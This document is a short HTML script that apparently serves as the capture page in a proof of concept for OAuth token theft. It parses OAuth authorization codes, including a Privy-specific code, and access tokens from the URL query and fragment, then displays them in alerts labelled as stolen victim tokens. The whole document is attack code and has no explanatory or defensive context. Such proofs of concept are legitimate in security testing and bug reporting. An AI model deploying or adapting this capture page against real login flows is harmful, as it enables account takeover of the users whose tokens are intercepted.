
<script>
    (function () {
        try {
            const query = new URLSearchParams(window.location.search);
            const code = query.get('code');
            const privyCode = query.get('privy_oauth_code');

            if (code) {
                alert(`Your token is stolen: ${code}`);
            }

            if (privyCode) {
                alert(`Your token is stolen: ${privyCode}`);
            }

            const hash = window.location.hash.substring(1);
            const hashParams = Object.fromEntries(
                hash.split('&').map(pair => pair.split('='))
            );

            if (hashParams['access_token']) {
                alert(`Victim Token: ${hashParams['access_token']}`);
            }
        } catch (err) {
            console.error('Error parsing tokens:', err);
        }
    })();
</script>
